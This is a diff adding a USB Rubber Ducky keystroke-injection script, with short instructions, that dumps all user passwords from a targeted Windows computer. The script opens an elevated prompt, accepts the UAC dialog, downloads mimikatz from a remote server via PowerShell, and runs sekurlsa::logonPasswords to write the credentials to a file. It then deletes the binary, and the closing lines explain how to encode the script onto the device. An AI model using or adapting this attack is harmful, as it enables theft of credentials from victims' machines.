@@ -1,0 +1,50 @@
+The example bellow will dump all the passwords of all users of the computer targeted.
+You must obtain mimikatz.exe before then place it on the computer targeted.
+    You can get it from here https://github.com/gentilkiwi/mimikatz then compile it yourself on a Linux OS.
+    Eventually
+        you can host the exe on a remote server, this script will download it on the computer victime
+        or you can directly put it on the computer
+I remove the part of the script that send the dump by email.
+
+
+REM -------------open command prompt with admin privileges
+DELAY 3000
+WINDOWS r
+DELAY 1000
+STRING cmd
+DELAY 1000
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT y
+ENTER
+DELAY 300
+REM -------------download appropriate mimikatz for architecture
+STRING powershell if ([System.IntPtr]::Size -eq 4) { (new-object
+System.Net.WebClient).DownloadFile('http://url to 32bit mimikatz.exe','%TEMP%\pw.exe'); }else{
+(new-object System.Net.WebClient).DownloadFile('http://url to 64bit
+mimikatz.exe','%TEMP%\pw.exe');}
+ENTER
+DELAY 5000
+REM -------------get the passwords and save to c:\pwlog.txt
+STRING %TEMP%\pw.exe > c:\pwlog.txt & type pwlog.txt;
+ENTER
+DELAY 2000
+STRING privilege::debug
+ENTER
+DELAY 1000
+STRING sekurlsa::logonPasswords full
+ENTER
+DELAY 1000
+STRING exit
+ENTER
+DELAY 300
+STRING del %TEMP%\pw.exe
+ENTER
+DELAY 300
+STRING exit
+ENTER
+
+
+REM at the begin of a line means a commented line
+To generate the payload : 'java -jar encoder.jar -i C:\RubberDucky\dump.txt -o F:\inject.bin -l fr'
+Where F:\ is the root of your badUSB on a Windows OS.
